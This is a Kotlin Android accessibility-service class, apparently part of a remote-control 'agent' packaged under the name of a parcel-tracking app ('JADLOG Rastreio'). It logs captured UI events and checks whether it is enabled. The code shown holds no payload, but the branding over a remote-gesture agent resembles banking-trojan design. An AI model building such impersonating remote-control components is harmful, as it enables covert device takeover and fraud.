package com.droidview.agent

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.droidview.agent.accessibility.AgentAccessibilityService

/**
 * Serviço de Acessibilidade oficial do JADLOG Rastreio (DViewAccessibilityService).
 * Declarado no AndroidManifest.xml com android.permission.BIND_ACCESSIBILITY_SERVICE.
 * Permite supervisão, assistência remota autorizada e despacho de ações e gestos.
 */
class DViewAccessibilityService : AgentAccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "DViewAccessibilityService conectado para JADLOG Rastreio.")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        super.onAccessibilityEvent(event)
        if (event == null) return
        val pkg = event.packageName?.toString() ?: ""
        val cls = event.className?.toString() ?: ""
        Log.d(TAG, "Evento capturado no JADLOG Rastreio: tipo=${event.eventType} pkg=$pkg cls=$cls")
    }

    override fun onInterrupt() {
        super.onInterrupt()
        Log.w(TAG, "DViewAccessibilityService interrompido.")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) {
            instance = null
        }
        Log.i(TAG, "DViewAccessibilityService destruído.")
    }

    companion object {
        private const val TAG = "DViewAccessibility"
        var instance: DViewAccessibilityService? = null
            private set

        fun isRunning(): Boolean = instance != null || AgentAccessibilityService.isServiceRunning()

        /**
         * Verifica no Android Settings se o serviço de acessibilidade do JADLOG Rastreio está ativo.
         * Utiliza Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES.
         */
        fun isAccessibilityEnabled(context: Context): Boolean {
            if (isRunning()) return true

            val expectedNames = arrayOf(
                "${context.packageName}/${DViewAccessibilityService::class.java.name}",
                "${context.packageName}/${AgentAccessibilityService::class.java.name}",
                "${context.packageName}/.DViewAccessibilityService",
                "${context.packageName}/.accessibility.AgentAccessibilityService"
            )

            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val colonSplitter = TextUtils.SimpleStringSplitter(':')
            colonSplitter.setString(enabledServices)
            while (colonSplitter.hasNext()) {
                val componentName = colonSplitter.next()
                for (expected in expectedNames) {
                    if (componentName.equals(expected, ignoreCase = true)) {
                        return true
                    }
                }
                if (componentName.contains(context.packageName, ignoreCase = true)) {
                    return true
                }
            }
            return false
        }
    }
}
